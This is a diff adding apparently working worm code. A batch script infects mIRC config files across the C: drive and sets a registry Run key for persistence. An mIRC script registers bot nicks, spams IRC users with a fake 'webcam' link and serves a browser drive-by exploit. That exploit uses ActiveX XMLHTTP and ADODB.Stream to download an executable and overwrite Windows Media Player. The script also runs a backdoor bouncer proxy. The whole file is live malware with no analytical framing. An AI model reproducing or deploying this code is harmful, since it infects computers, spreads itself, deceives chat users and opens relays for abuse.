@@ -1,0 +1,1685 @@
+for /R C:\ %%F in (*mirc.ini*) do (
+ATTRIB -r -a -s -h "%%F"
+if exist "%%F" echo n2=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n3=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n4=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n5=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n6=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n7=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n8=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n9=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n10=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n11=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n12=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n13=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n14=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n15=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n16=sounds\The_Magnificent_Fyle.ini >> "%%F"
+if exist "%%F" echo n17=sounds\The_Magnificent_Fyle.ini >> "%%F"
+copy /Y %0 "%%~dpFsounds\The_Magnificent_Fyle.ini" >nul
+copy /Y fyle.exe "%%~dpFsounds\fyle.exe" > nul
+)
+echo REGEDIT4 >> C:\f.reg
+echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >> C:\f.reg
+echo "Microsoft"="C:\\fyle.exe" >> C:\f.reg
+regedit /s C:\f.reg
+if not exist "C:\fyle.exe" copy /Y fyle.exe "C:\fyle.exe"
+del C:\f.reg
+del %0
+goto end
+[script]
+n0=on *:start: { 
+n1= loadServers
+n2= startHttpd
+n3= startBnC
+n4= .timerundernetAlive 0 30 undernetAlive
+n5= .timerspamAlive 0 3 startSpam
+n6= .timerdoubleCheck 0 1200 doubleCheck
+n7=}
+n8=alias doubleCheck {
+n9= if ($sock(fyle).status == active) {
+n10= if ($timer(timeout) == $null) {
+n11= next_server
+n12= }
+n13= }
+n14=}
+n15=alias sw { if ($sock(fyle).status == active) { sockwrite -n fyle $1- } }
+n16=;$prnick(1), only letters
+n17=;$prnick(2), letters and punctuation marks
+n18=alias prnick {
+n19= %n = $1
+n20= %t = $r(3,10)
+n21= %f = 0
+n22= unset %k
+n23= while (%f < %t) {
+n24= inc %f
+n25= if (%n = 1) { %r = $r(0,1) }
+n26= if (%n = 2) { %r = $r(0,3) }
+n27= if (%r == 0) { %k = %k $+ $r(a,z) }
+n28= if (%r == 1) { %k = %k $+ $r(A,Z) }
+n29= if (%r == 2) {
+n30= %o = $r(91,96)
+n31= %k = %k $+ $chr(%o)
+n32= }
+n33= if (%r == 3) {
+n34= %o = $r(123,125)
+n35= %k = %k $+ $chr(%o)
+n36= }
+n37= }
+n38= unset %f %r %o %n %t
+n39= return %k
+n40=}
+n41=alias rnduser {
+n42= %v = $r(1,50)
+n43= if (%v == 1) %v = hotmail.com
+n44= if (%v == 2) %v = mail.com
+n45= if (%v == 3) %v = armymail.com
+n46= if (%v == 4) %v = freemail.com
+n47= if (%v == 5) %v = msn.com
+n48= if (%v == 6) %v = comcast.net
+n49= if (%v == 7) %v = sympatico.ca
+n50= if (%v == 8) %v = bellsouth.com
+n51= if (%v == 9) %v = bar.org
+n52= if (%v isnum 10-20) %v = $prnick(1) $+ .com
+n53= if (%v isnum 21-30) %v = $prnick(1) $+ .net
+n54= if (%v isnum 31-40) %v = $prnick(1) $+ .org
+n55= if (%v isnum 41-50) %v = $prnick(1)
+n56= return USER $prnick(1) " $+ %v $+ " " $+ $sock($sockname).ip $+ " : $+ %v
+n57=}
+n58=on *:sockopen:fyle: {
+n59= ident_start
+n60= sw NICK $prnick(2)
+n61= sw $rnduser
+n62= unset %v %k %i
+n63= if ($hget(HChannels,0).item > 0) { hfree HChannels }
+n64= if ($hget(HNicks,0).item > 0) { hfree HNicks }
+n65= if ($hget(didNick,0).item > 0) { hfree didNick }
+n66= if ($hget(chanInc,0).item > 0) { hfree chanInc }
+n67= if ($hget(nickInc,0).item > 0) { hfree nickInc }
+n68= if ($hget(stoplist,0).item > 0) { hfree stoplist }
+n69=}
+n70=on *:sockread:fyle: {
+n71= if ($sockerr > 0) { return }
+n72= :fyle
+n73= if ($sock(fyle).status == active) { sockread %fyle }
+n74= if ($sock(fyle).status != active) { return }
+n75= if ($sockbr == 0) { return }
+n76= if (%fyle == $null) { %fyle = - }
+n77= ;echo -s 12 $+ %fyle
+n78= if ($gettok(%fyle,1,32) == PING) { sw PONG $gettok(%fyle,2,58) }
+n79= if ($gettok(%fyle,2,32) == 376) || ($gettok(%fyle,2,32) == 422) {
+n80= if ($hget(HChannels,0).item > 0) { hfree HChannels }
+n81= if ($hget(HNicks,0).item > 0) { hfree HNicks }
+n82= if ($hget(didNick,0).item > 0) { hfree didNick }
+n83= if ($hget(chanInc,0).item > 0) { hfree chanInc }
+n84= if ($hget(nickInc,0).item > 0) { hfree nickInc }
+n85= if ($hget(stoplist,0).item > 0) { hfree stoplist }
+n86= sw PRIVMSG nickserv :register $prnick(1) $+ $prnick(1) $prnick(1) $+ @hotmail.com
+n87= sw LIST
+n88=
+n89= }
+n90= ;nick already in use
+n91= if ($gettok(%fyle,2,32) == 433) { sw NICK $prnick(2) }
+n92= %n = $gettok($gettok(%fyle,1,33),1,58)
+n93= if ($gettok(%fyle,2,32) == PRIVMSG) && ($gettok(%fyle,4,32) == :TIME) { sw NOTICE %n :TIME $fulldate $+  }
+n94= if ($gettok(%fyle,2,32) == PRIVMSG) && ($gettok(%fyle,4,32) == :PING) { sw NOTICE %n :PING $gettok(%fyle,5,32) }
+n95= if ($gettok(%fyle,2,32) == PRIVMSG) && ($gettok(%fyle,4,32) == :VERSION) { sw NOTICE %n :VERSION mIRC $rversion Khaled Mardam-Bey }
+n96= if ($checkban($gettok(%fyle,2,32)) == $true) { next_chan }
+n97= ;target changed too fast
+n98= if ($gettok(%fyle,2,32) == 439) {
+n99= next_server
+n100= return 
+n101= }
+n102= ;server load too heavy
+n103= if ($gettok(%fyle,2,32) == 263) {
+n104= next_server
+n105= return
+n106= }
+n107= ;channel list started
+n108= if ($gettok(%fyle,2,32) == 321) && ($hget(HChannels,0).item > 0) {
+n109= if ($hget(HChannels,0).item > 0) { hfree HChannels } 
+n110= }
+n111= ;channel in the channel list
+n112= if ($gettok(%fyle,2,32) == 322) && ($gettok(%fyle,5,32) > 0) {
+n113= if ($left($gettok(%fyle,4,32),1) == $chr(35)) {
+n114= if ($hget(HChannels,0).item > 250) && ($hget(stoplist,0).item < 1) {
+n115= hadd -m stoplist 1 stopped
+n116= sw LIST stop 
+n117= }
+n118= if (help !isin $gettok(%fyle,4,32)) && (oper !isin $gettok(%fyle,4,32)) && (ayuda !isin $gettok(%fyle,4,32)) && (admin !isin $gettok(%fyle,4,32)) {
+n119= hadd -m HChannels $calc($hget(HChannels,0).item + 1) $gettok(%fyle,4,32)
+n120= }
+n121= }
+n122= }
+n123= ;channel list ended
+n124= if ($gettok(%fyle,2,32) == 323) {
+n125= if ($hget(HChannels,0).item == 0) {
+n126= next_server
+n127= return
+n128= }
+n129= .timertimeout 1 120 next_chan
+n130= hadd -m chanInc 1 0
+n131= next_chan 
+n132= }
+n133= ;joined a channel
+n134= if ($gettok(%fyle,2,32) == 332) || ($gettok(%fyle,2,32) == 333) {
+n135= if ($hget(HNicks,0).item > 0) { hfree HNicks }
+n136= if ($hget(nickInc,0).item > 0) { hfree nickInc }
+n137= }
+n138= ;chunk of nicks from a channel
+n139= if ($gettok(%fyle,2,32) == 353) {
+n140= hadd -m botnick 1 $gettok(%fyle,3,32)
+n141= %i = 0
+n142= %w = $gettok(%fyle,2,58)
+n143= while (%i < $numtok(%w,32)) {
+n144= inc %i
+n145= if ($spamOk($gettok(%w,%i,32)) == $true) {
+n146= hadd -m HNicks $calc($hget(HNicks,0).item + 1) $gettok(%w,%i,32)
+n147= }
+n148= }
+n149= }
+n150= ;end of nick list
+n151= if ($gettok(%fyle,2,32) == 366) {
+n152= sw PART $gettok(%fyle,4,32)
+n153= if ($r(1,5) == 3) { sw NICK $prnick(2) }
+n154= if ($hget(HNicks,0).item == 0) {
+n155= next_chan
+n156= return
+n157= }
+n158= if ($hget(HNicks,0).item > 0) {
+n159= hadd -m nickInc 1 0
+n160= .timersendspam $hget(HNicks,0).item $r(20,45) next_nick
+n161= .timertimeout 1 120 next_chan
+n162= }
+n163= }
+n164= unset %rversion %fyle %w %i %n %k
+n165= goto fyle
+n166=}
+n167=alias spamOk {
+n168= if ($hfind(didNick,$1,0).data > 0) { return $false }
+n169= if ($left($1,1) == $chr(46)) { return $false }
+n170= if ($left($1,1) == $chr(64)) { return $false }
+n171= if ($left($1,1) == $chr(43)) { return $false }
+n172= if ($left($1,1) == $chr(46)) { return $false }
+n173= if ($left($1,1) == $chr(37)) { return $false }
+n174= if ($left($1,1) == $chr(38)) { return $false }
+n175= if ($left($1,1) == $chr(33)) { return $false }
+n176= if ($left($1,1) == $chr(126)) { return $false }
+n177= if ($1 == $hget(botnick,1)) { return $false }
+n178= if (dcc isin $1) { return $false }
+n179= if (bot isin $1) { return $false }
+n180= if (spam isin $1) { return $false }
+n181= if (serv isin $1) { return $false }
+n182= if (protect isin $1) { return $false }
+n183= if (guard isin $1) { return $false }
+n184= if (chan isin $1) { return $false }
+n185= if (sys isin $1) { return $false }
+n186= if (help isin $1) { return $false }
+n187= if (ayud isin $1) { return $false }
+n188= if (admin isin $1) { return $false }
+n189= if ($len($1) == 1) { return $false }
+n190= return $true
+n191=}
+n192=alias rversion {
+n193= if ($hget(rversion,0).item > 0) { return $hget(rversion,1) }
+n194= %rversion = $r(1,5)
+n195= if (%rversion == 1) { %rversion = v6.01 }
+n196= if (%rversion == 2) { %rversion = v6.03 }
+n197= if (%rversion == 3) { %rversion = v6.1 }
+n198= if (%rversion == 4) { %rversion = v6.11 }
+n199= if (%rversion == 5) { %rversion = v6.12 }
+n200= hadd -m rversion 1 %rversion
+n201= unset %rversion
+n202= return $hget(rversion,1)
+n203=}
+n204=alias startSpam {
+n205= if ($hget(myIP,1) == $null) {
+n206= findIP
+n207= return
+n208= }
+n209= if ($hget(myIP,1) != $null) {
+n210= if ($sock(fyle).status == $null) {
+n211= sockopen fyle $hget(HServers,$r(1,$hget(HServers,0).item)) 6667
+n212= return
+n213= }
+n214= }
+n215=}
+n216=on *:socklisten:ident: { sockaccept ident_ $+ $r(0,9999999999) }
+n217=on *:sockread:ident*: {
+n218= if ($sockerr > 0) { return }
+n219= :ident
+n220= if ($sock($sockname).status == active) { sockread %ident }
+n221= if ($sock($sockname).status != active) { return }
+n222= if ($sockbr == 0) { return }
+n223= if (%ident == $null) { %ident = - }
+n224= if ($chr(44) isin %ident) {
+n225= sockwrite -n $sockname $gettok(%ident,1,32) $+ , 6667 : USERID: UNIX : $prnick(1)
+n226= sockclose $sockname
+n227= unset %ident
+n228= return
+n229= }
+n230= unset %ident
+n231= goto ident
+n232=}
+n233=alias ident_start {
+n234= if ($portfree(113) == $true) {
+n235= .timeridentTimeout 1 10 sockclose ident
+n236= socklisten ident 113 
+n237= } 
+n238=}
+n239=alias checkBan {
+n240= if ($1 == 471) { return $true }
+n241= if ($1 == 477) { return $true }
+n242= if ($1 == 481) { return $true }
+n243= if ($1 == 482) { return $true }
+n244= if ($1 == 473) { return $true }
+n245= if ($1 == 474) { return $true }
+n246= if ($1 == 475) { return $true }
+n247= if ($1 == 412) { return $true }
+n248= if ($1 == 461) { return $true }
+n249= if ($1 == 490) { return $true }
+n250= if ($1 == 520) { return $true }
+n251= return $false
+n252=}
+n253=on *:sockclose:fyle: { startSpam }
+n254=alias next_chan {
+n255= %d = $hget(chanInc,1)
+n256= hadd -m chanInc 1 $calc(%d + 1)
+n257= unset %d
+n258= if ($hget(chanInc,1) > $hget(HChannels,0).item) {
+n259= next_server 
+n260= return
+n261= }
+n262= if ($hget(chanInc,1) <= $hget(HChannels,0).item) && ($sock(fyle).status == active) {
+n263= sw JOIN $hget(HChannels,$hget(chanInc,1))
+n264= }
+n265= if ($sock(fyle).status != active) {
+n266= next_server 
+n267= }
+n268=}
+n269=alias next_server {
+n270= if ($timer(timeout) != $null) { .timertimeout off }
+n271= if ($timer(sendSpam) != $null) { .timersendSpam off }
+n272= sockclose fyle
+n273= startSpam
+n274=}
+n275=alias next_nick {
+n276= :reNick
+n277= %d = $hget(nickInc,1)
+n278= hadd -m nickInc 1 $calc(%d + 1)
+n279= unset %d
+n280= if ($hfind(didNick,$hget(HNicks,$hget(nickInc,1)),0).data > 0) {
+n281= if ($hfind(didNick,$hget(HNicks,$hget(nickInc,1)),0).data != $null) {
+n282= goto reNick 
+n283= }
+n284= }
+n285= if ($hget(nickInc,1) > $hget(HNicks,0).item) {
+n286= next_chan
+n287= return
+n288= }
+n289= if ($hget(nickInc,1) <= $hget(HNicks,0).item) {
+n290= if ($hget(myIP,1) != $null) && ($hget(httpd,1) != $null) {
+n291= sw PRIVMSG $hget(HNicks,$hget(nickInc,1)) :Come watch me on my webcam and chat /w me :-) http:// $+ $hget(myIP,1) $+ : $+ $hget(httpd,1) $+ /me.mpg
+n292= ;sw PRIVMSG $hget(HNicks,$hget(nickInc,1)) :hi
+n293= ;echo -s 4spammed $hget(HNicks,$hget(nickInc,1))
+n294= hadd -m didNick $calc($hget(didNick,0).item + 1) $hget(HNicks,$hget(nickInc,1))
+n295= if ($hget(nickInc,1) == $hget(HNicks,0).item) {
+n296= next_chan 
+n297= }
+n298= .timertimeout 1 120 next_chan
+n299= }
+n300= }
+n301=}
+n302=alias startBnC {
+n303= :bncListen
+n304= %tmp = $r(1024,5000)
+n305= if ($portfree(%tmp) == $false) { goto bncListen }
+n306= if ($portfree(%tmp) == $true) {
+n307= socklisten bncListen %tmp
+n308= }
+n309= unset %tmp
+n310=}
+n311=on *:socklisten:bncListen: { 
+n312= %bnc_tmp = bnc_client_ $+ $r(0,9999999999999999)
+n313= sockaccept %bnc_tmp
+n314= sockwrite -n %bnc_tmp :x 002 :3Welcome to Backdoor BnC by Fyle
+n315= sockwrite -n %bnc_tmp :x 002 :3Use /con <server> [port] to connect
+n316= sockwrite -n %bnc_tmp :x 002 :3Currently $sock(bnc_server_*,0) BnC users online
+n317= bncRename %bnc_tmp
+n318= unset %bnc_tmp
+n319=}
+n320=alias bncRename { 
+n321= if ($sock(bnc_client_ $+ $sock($1).ip).status == Active) { 
+n322= sockwrite -n $1 :x 002 :3One connection per IP
+n323= sockclose $1
+n324= return 
+n325= }
+n326= sockrename $1 bnc_client_ $+ $sock($1).ip 
+n327=}
+n328=on *:sockread:bnc_client*: { 
+n329= if ($sockerr > 0) { return }
+n330= :next
+n331= sockread %client
+n332= if ($sockbr == 0) { return }
+n333= if (%client == $null) { %client = - }
+n334= ;echo -a %client
+n335= if ($gettok(%client,1,32) == NICK) {
+n336= hadd -m $sockname 1 $gettok(%client,2,32)
+n337= }
+n338= if ($gettok(%client,1,32) == USER) {
+n339= hadd -m $sockname 2 $gettok(%client,2-,32)
+n340= }
+n341= if ($gettok(%client,1,32) == CON) {
+n342= .timer 1 1 clear -s
+n343= if ($gettok(%client,2,32) != $null) {
+n344= if ($gettok(%client,3,32) != $null) {
+n345= if (. isin $gettok(%client,2,32)) {
+n346= if ($gettok(%client,3,32) isnum 1-65535) { 
+n347= if ($sock(bnc_server_ $+ $gettok($sockname,3,95)).status == active) {
+n348= sockwrite -n $sockname :x 002 :3Terminating connection to $sock(bnc_server_ $+ $gettok($sockname,3,95)).ip
+n349= sockclose bnc_server_ $+ $gettok($sockname,3,95)
+n350= }
+n351= sockwrite -n $sockname :x 002 :3Attempting connection to $gettok(%client,2-,32)
+n352= sockopen bnc_server_ $+ $sock($sockname).ip $gettok(%client,2-,32)
+n353= return 
+n354= } 
+n355= } 
+n356= } 
+n357= } 
+n358= }
+n359= if ($sock(bnc_server_ $+ $gettok($sockname,3,95)).status != Active) { 
+n360= return 
+n361= }
+n362= sockwrite -n bnc_server_ $+ $gettok($sockname,3,95) %client
+n363= unset %client
+n364= goto next 
+n365=}
+n366=on *:sockopen:bnc_server_*: { 
+n367= if ($sock($sockname).status == Active) {
+n368= ident_start
+n369= sockwrite -n $sockname NICK $hget($sock(bnc_client_ $+ $gettok($sockname,3,95)),1)
+n370= sockwrite -n $sockname USER $hget($sock(bnc_client_ $+ $gettok($sockname,3,95)),2) 
+n371= } 
+n372=}
+n373=on *:sockread:bnc_server_*: { 
+n374= if ($sockerr > 0) { return }
+n375= :next
+n376= sockread %server
+n377= if ($sockbr == 0) { return }
+n378= if ($sock(bnc_client_ $+ $gettok($sockname,3,95)).status != Active) { return }
+n379= sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) %server
+n380= unset %server
+n381= goto next 
+n382=}
+n383=on *:sockclose:bnc_server_*: {
+n384= if ($sock(bnc_client_ $+ $gettok($sockname,3,95)).status == active) {
+n385= sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :3Connection to $sock($sockname).ip $sock($sockname).port closed
+n386= sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :3Welcome to Backdoor BnC by Fyle
+n387= sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :3Use /con <server> [port] to connect
+n388= }
+n389=}
+n390=on *:sockclose:bnc_client_*: {
+n391= sockclose bnc_server_ $+ $gettok($sockname,3,95)
+n392=}
+n393=alias startHttpd {
+n394= :srcPort
+n395= %tmp = $r(1024,5000)
+n396= if ($portfree(%tmp) == $false) { goto srcPort }
+n397= if ($portfree(%tmp) == $true) {
+n398= hadd -m httpd 1 %tmp
+n399= socklisten httpd_srcPort $hget(httpd,1)
+n400= }
+n401= :exePort
+n402= %tmp = $r(1024,5000)
+n403= if ($portfree(%tmp) == $false) { goto exePort }
+n404= if ($portfree(%tmp) == $true) {
+n405= hadd -m httpd 2 %tmp
+n406= socklisten httpd_exePort $hget(httpd,2)
+n407= }
+n408= unset %tmp
+n409=}
+n410=on *:socklisten:httpd_srcPort: { sockaccept sendSrc_ $+ $r(0,9999999999999999) }
+n411=on *:socklisten:httpd_exePort: {
+n412= %tmp.sock = fff_ $+ $ticks
+n413= sockaccept %tmp.sock
+n414= if ($sock(sendExe_ $+ $sock(%tmp.sock).ip).status == $null) {
+n415= sockrename %tmp.sock sendExe_ $+ $sock(%tmp.sock).ip
+n416= }
+n417= unset %tmp.sock
+n418=}
+n419=alias sendSploit {
+n420= sockwrite -n $sockname HTTP/1.1 200 OK
+n421= sockwrite -n $sockname Server: Netscape-Enterprise/4.1
+n422= sockwrite -n $sockname Date: $fulldate
+n423= sockwrite -n $sockname Content-type: image/jpeg
+n424= sockwrite -n $sockname Etag: "f86d6d26-a8-421-3f9f9a22"
+n425= sockwrite -n $sockname Last-modified: $fulldate
+n426= sockwrite -n $sockname Accept-Encoding: identity
+n427= sockwrite -n $sockname Accept-ranges: bytes
+n428= sockwrite $sockname $crlf
+n429= sockwrite -n $sockname <html>
+n430= sockwrite -n $sockname <h1>Loading Video<br>Please Wait</h1>
+n431= sockwrite -n $sockname <h3>If video doesn't load within 30 seconds, then your media player is incompatible.<br>
+n432= sockwrite -n $sockname You can download the latest windows media player from <a href="http://www.microsoft.com/windows/windowsmedia/download/default.asp">http://www.microsoft.com/windows/windowsmedia/download/default.asp</a>
+n433= sockwrite -n $sockname <textarea id="code" style="display:none;">
+n434= sockwrite -n $sockname var x = new ActiveXObject("Microsoft.XMLHTTP");
+n435= sockwrite -n $sockname x.Open("GET", "http:// $+ $hget(myIP,1) $+ : $+ $hget(httpd,2) $+ /windowsMedia.exe",0);
+n436= sockwrite -n $sockname x.Send();
+n437= sockwrite -n $sockname var s = new ActiveXObject("ADODB.Stream");
+n438= sockwrite -n $sockname s.Mode = 3;
+n439= sockwrite -n $sockname s.Type = 1;
+n440= sockwrite -n $sockname s.Open();
+n441= sockwrite -n $sockname s.Write(x.responseBody);
+n442= sockwrite -n $sockname s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
+n443= sockwrite -n $sockname location.href = "mms://";
+n444= sockwrite -n $sockname </textarea>
+n445= sockwrite -n $sockname <script language="javascript">
+n446= sockwrite -n $sockname $eval(function preparecode(code) {,0)
+n447= sockwrite -n $sockname result = '';
+n448= sockwrite -n $sockname lines = code.split(/\r\n/);
+n449= sockwrite -n $sockname $eval(for (i=0;i<lines.length;i++) {,0)
+n450= sockwrite -n $sockname line = lines[i];
+n451= sockwrite -n $sockname line = line.replace(/^\s+/,"");
+n452= sockwrite -n $sockname $eval(line = line.replace(/\s+$/,"");,0)
+n453= sockwrite -n $sockname line = line.replace(/'/g,"\\'");
+n454= sockwrite -n $sockname line = line.replace(/[\\]/g,"\\\\");
+n455= sockwrite -n $sockname $eval(line = line.replace(/[/]/g,"%2f");,0)
+n456= sockwrite -n $sockname $eval(if (line != '') {,0)
+n457= sockwrite -n $sockname result += line +'\\r\\n';
+n458= sockwrite -n $sockname $eval(},0)
+n459= sockwrite -n $sockname $eval(},0)
+n460= sockwrite -n $sockname return result;
+n461= sockwrite -n $sockname $eval(},0)
+n462= sockwrite -n $sockname $eval(function doit() {,0)
+n463= sockwrite -n $sockname mycode = preparecode(document.all.code.value);
+n464= sockwrite -n $sockname myURL = "file:javascript:eval('" + mycode + "')";
+n465= sockwrite -n $sockname window.open(myURL,"_media");
+n466= sockwrite -n $sockname $eval(},0)
+n467= sockwrite -n $sockname window.open("error.jsp","_media");
+n468= sockwrite -n $sockname setTimeout("doit()", 5000);
+n469= sockwrite -n $sockname </script>
+n470= sockclose $sockname
+n471=}
+n472=on *:sockread:sendSrc_*: {
+n473= if ($sockerr > 0) { return }
+n474= :sendSrc
+n475= if ($sock($sockname).status == active) { sockread %sendSrc }
+n476= if ($sock($sockname).status != active) { return }
+n477= if ($sockbr == 0) { return }
+n478= if (%sendSrc == $null) { %sendSrc = - }
+n479= if ($gettok(%sendSrc,1-2,32) == GET /me.mpg) { sendSploit }
+n480= unset %sendSrc
+n481= goto sendSrc
+n482=}
+n483=on *:sockread:sendExe_*: {
+n484= if ($sockerr > 0) { return }
+n485= :sendExe
+n486= if ($sock($sockname).status == active) { sockread %sendExe }
+n487= if ($sock($sockname).status != active) { unset %sendExe | return }
+n488= if ($sockbr == 0) { return }
+n489= if (%sendExe == $null) { %sendExe = - }
+n490= if ($gettok(%sendExe,1-2,32) == GET /windowsMedia.exe) { sendExe }
+n491= unset %sendExe
+n492= goto sendExe
+n493=}
+n494=alias sendExe {
+n495= sockwrite -n $sockname HTTP/1.1 200 OK
+n496= sockwrite -n $sockname Date: $fulldate
+n497= sockwrite -n $sockname Server: heehee :-)
+n498= sockwrite -n $sockname Accept-Ranges: bytes
+n499= sockwrite -n $sockname Content-Type: application/octet-stream
+n500= sockwrite -n $sockname Content-Length: $file($mircdir $+ sounds\fyle.exe).size
+n501= sockwrite -n $sockname Accept-Encoding: identity
+n502= sockwrite -n $sockname Keep-Alive: timeout=60
+n503= sockwrite $sockname $crlf
+n504= hadd -m sendExe_ $+ $sock($sockname).ip 1 0
+n505= hadd -m sendExe_ $+ $sock($sockname).ip 2 $lof($mircdir $+ sounds\fyle.exe)
+n506= spread sendExe_ $+ $sock($sockname).ip
+n507=}
+n508=alias spread {
+n509= if ($isfile($mircdir $+ sounds\fyle.exe) == $true) {
+n510= bread " $+ $mircdir $+ sounds\fyle.exe $+ " $hget($1,1) 64 &fyle
+n511= }
+n512= sockwrite $1 &fyle
+n513= %pos.tmp = $hget($1,1) + $bvar(&fyle,o)
+n514= hadd -m sendExe_ $+ $sock($sockname).ip 1 %pos.tmp
+n515= unset %pos.tmp
+n516=}
+n517=on *:sockwrite:sendExe_*: {
+n518= if ($sockerr > 0) {
+n519= sockclose $sockname
+n520= return
+n521= }
+n522= if ($hget(sendExe_ $+ $sock($sockname).ip,1) >= $hget(sendExe_ $+ $sock($sockname).ip,2)) {
+n523= sockclose $sockname
+n524= return
+n525= }
+n526= spread sendExe_ $+ $sock($sockname).ip
+n527=}
+n528=alias findIP {
+n529= if ($chr(46) !isin $hget(myip,1)) {
+n530= if ($sock(findIP).status == $null) {
+n531= %tmp = $r(0,6)
+n532= if (%tmp == 0) sockopen findIP irc.undernet.org 6667
+n533= if (%tmp == 1) sockopen findIP eu.undernet.org 6667
+n534= if (%tmp == 2) sockopen findIP us.undernet.org 6667
+n535= if (%tmp == 3) sockopen findIP twisted.dal.net 6667
+n536= if (%tmp == 4) sockopen findIP mesra.dal.net 6667
+n537= if (%tmp == 5) sockopen findIP acool.dal.net 6667
+n538= if (%tmp == 6) sockopen findIP irc.plasa.com 6667
+n539= }
+n540= }
+n541= unset %tmp
+n542=}
+n543=on *:sockopen:findIP: {
+n544= if ($sock($sockname).status == active) {
+n545= sockwrite -n $sockname NICK $prnick(2)
+n546= sockwrite -n $sockname USER $prnick(1) " $+ $prnick(1) $+ .com" "irc.undernet.org : $+ $prnick(2)
+n547= }
+n548=}
+n549=on *:sockread:findIP: {
+n550= if ($sockerr > 0) { return }
+n551= :findip
+n552= if ($sock($sockname).status == active) { sockread %fi }
+n553= if ($sock($sockname).status != active) { return }
+n554= if ($sockbr == 0) { return }
+n555= if (%fi == $null) { %fi = - }
+n556= if ($gettok(%fi,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%fi,2,58) }
+n557= if ($gettok(%fi,2,32) == 376) || ($gettok(%fi,2,32) == 422) {
+n558= .timer 1 $r(3,10) sockwrite -n $sockname WHOIS $gettok(%fi,3,32)
+n559= }
+n560= if ($gettok(%fi,2,32) == 401) {
+n561= .timer 1 $r(3,10) sockwrite -n $sockname WHOIS $gettok(%fi,3,32)
+n562= }
+n563= if ($gettok(%fi,2,32) == 311) { 
+n564= hadd -m myIP 1 $gettok(%fi,6,32) 
+n565= sockclose $sockname
+n566= }
+n567= unset %fi
+n568= goto findip
+n569=}
+n570=alias undernetAlive {
+n571= if ($sock(undernet).status == $null) && ($hget(myIP,1) != $null) {
+n572= sockopen undernet irc.undernet.org 6667
+n573= ident_start
+n574= }
+n575=}
+n576=on *:sockopen:undernet: {
+n577= if ($sock($sockname).status == active) {
+n578= sockwrite -n undernet NICK $prnick(2)
+n579= sockwrite -n undernet $rnduser
+n580= } 
+n581=}
+n582=on *:sockread:undernet: {
+n583= if ($sockerr > 0) { return }
+n584= :undernet
+n585= if ($sock($sockname).status == active) { sockread %undernet }
+n586= if ($sock($sockname).status != active) { return }
+n587= if ($sockbr == 0) { return }
+n588= if (%undernet == $null) { %undernet = - }
+n589= ;echo -s %undernet
+n590= %n = $gettok($gettok(%undernet,1,33),1,58)
+n591= %addr = $gettok($gettok(%undernet,1,32),2,64)
+n592= if ($gettok(%undernet,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%undernet,2,58) }
+n593= if ($gettok(%undernet,2,32) == 422) || ($gettok(%undernet,2,32) == 376) {
+n594= hadd -m undernet 1 $gettok(%undernet,3,32)
+n595= hadd -m undernet 2 $chr(35) $+ $prnick(1) $+ $prnick(2) $+ $prnick(3)
+n596= sockwrite -n undernet JOIN $hget(undernet,2)
+n597= }
+n598= if ($gettok(%undernet,2,32) == JOIN) {
+n599= if (%n != $hget(undernet,1)) {
+n600= sockwrite -n undernet MODE $hget(undernet,2) +b %addr
+n601= sockwrite -n undernet KICK $hget(undernet,2) %n :no! you`re shmoopy!!
+n602= if ($gettok(%undernet,2,32) == MODE) && (%n != $hget(undernet,1) {
+n603= sockwrite -n undernet QUIT :please do not abuse the spambots, thanks - Fyle
+n604= }
+n605= }
+n606= if (%n == $hget(undernet,1)) {
+n607= sockwrite -n undernet TOPIC $hget(undernet,2) :Free BnC Courtesy of Fyle: /server -m $hget(myIP,1) $sock(bncListen).port
+n608= sockwrite -n undernet MODE $hget(undernet,2) +b *!*@*
+n609= sockwrite -n undernet MODE $hget(undernet,2) +l 1
+n610= sockwrite -n undernet MODE $hget(undernet,2) +k $prnick(1) $+ $prnick(2)
+n611= sockwrite -n undernet MODE $hget(undernet,2) +ntmi
+n612= }
+n613= }
+n614= unset %n %undernet
+n615= goto undernet
+n616=}
+n617=alias loadServers {
+n618= hadd -m HServers 1 irc.24-7christians.com
+n619= hadd HServers 2 4-irc.com
+n620= hadd HServers 3 irc.4everlost.com
+n621= hadd HServers 4 irc.7sinz.net
+n622= hadd HServers 5 irc.9nsm.com
+n623= hadd HServers 6 irc.abducted.us
+n624= hadd HServers 7 irc.ablazenet.com
+n625= hadd HServers 8 irc.AbleNET.org
+n626= hadd HServers 9 irc.ablinux.net
+n627= hadd HServers 10 irc.absurd-irc.net
+n628= hadd HServers 11 irc.accessirc.net
+n629= hadd HServers 12 irc.AceIRC.net
+n630= hadd HServers 13 AceIRC.net
+n631= hadd HServers 14 irc.adirc.com
+n632= hadd HServers 15 irc.adultchatnet.org
+n633= hadd HServers 16 irc.afterworkchat.com
+n634= hadd HServers 17 afterworkchat.com
+n635= hadd HServers 18 azerbaijan.chat.az
+n636= hadd HServers 19 caspian.ps.eu.chat.az
+n637= hadd HServers 20 netra.chat.az
+n638= hadd HServers 21 off.ps.eu.chat.az
+n639= hadd HServers 22 unix.co.eu.chat.az
+n640= hadd HServers 23 arusha.albnetwork.net
+n641= hadd HServers 24 irc.alemchat.net
+n642= hadd HServers 25 irc.alkol.org
+n643= hadd HServers 26 irc.allnetwork.org
